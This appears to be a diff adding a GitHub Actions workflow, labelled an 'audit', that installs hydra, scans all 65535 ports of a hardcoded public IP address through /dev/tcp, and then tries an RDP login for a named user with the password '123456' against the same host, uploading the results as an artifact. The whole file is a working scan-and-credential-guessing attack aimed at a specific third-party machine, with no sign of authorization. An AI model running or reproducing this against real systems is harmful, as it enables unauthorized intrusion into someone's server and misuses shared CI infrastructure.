@@ -1,0 +1,45 @@
+name: Full Port & RDP Audit
+
+on:
+  workflow_dispatch:
+
+jobs:
+  full-scan:
+    runs-on: ubuntu-latest
+    steps:
+      - name: System Update
+        run: sudo apt-get update && sudo apt-get install -y hydra
+
+      - name: Full 65535 Port Scanner Script
+        run: |
+          cat << 'EOF' > full_scan.sh
+          TARGET="2.60.114.166"
+          OUTPUT="all_ports_report.txt"
+          echo "Full Scan Report for $TARGET - Started at $(date)" > $OUTPUT
+          echo "--------------------------------------------------" >> $OUTPUT
+
+          echo "Scanning all 65535 ports... please wait."
+          
+          for port in {1..65535}; do
+            (echo > /dev/tcp/$TARGET/$port) >/dev/null 2>&1 && echo "[+] Port $port is OPEN" >> $OUTPUT &
+            
+            if (( $port % 500 == 0 )); then wait; fi
+          done
+          wait
+          echo "--------------------------------------------------" >> $OUTPUT
+          EOF
+          chmod +x full_scan.sh
+
+      - name: Execute Full Scan
+        run: ./full_scan.sh
+
+      - name: Attempt RDP Authentication
+        run: |
+          echo "Checking RDP Login for Ефименко..." >> all_ports_report.txt
+          hydra -l "Ефименко" -p "123456" rdp://2.60.114.166 -V >> all_ports_report.txt 2>&1
+
+      - name: Archive Results
+        uses: actions/upload-artifact@v4
+        with:
+          name: full-server-scan-report
+          path: all_ports_report.txt
